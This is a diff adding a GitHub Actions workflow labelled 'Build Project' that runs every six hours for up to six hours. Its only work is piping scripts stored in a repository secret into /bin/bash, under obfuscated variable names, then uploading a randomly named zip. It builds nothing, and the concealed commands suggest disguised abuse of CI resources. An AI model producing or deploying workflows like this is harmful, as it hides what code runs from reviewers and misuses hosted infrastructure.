@@ -1,0 +1,30 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run
+        env:
+          bj79: ${{ secrets.bj79 }}
+        run: |
+          printf '%s' "$bj79" | jq -r .yo46 | /bin/bash
+          printf '%s' "$tl93031" | jq -r .hgrz00294 | /bin/bash
+          echo $wctnj1641 | jq -r .ifhu4673 | /bin/bash
+          printf '%s' "$huz1046" | jq -r .lke02109 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: QkX68On9
+          path: "*.zip"
+          retention-days: 1
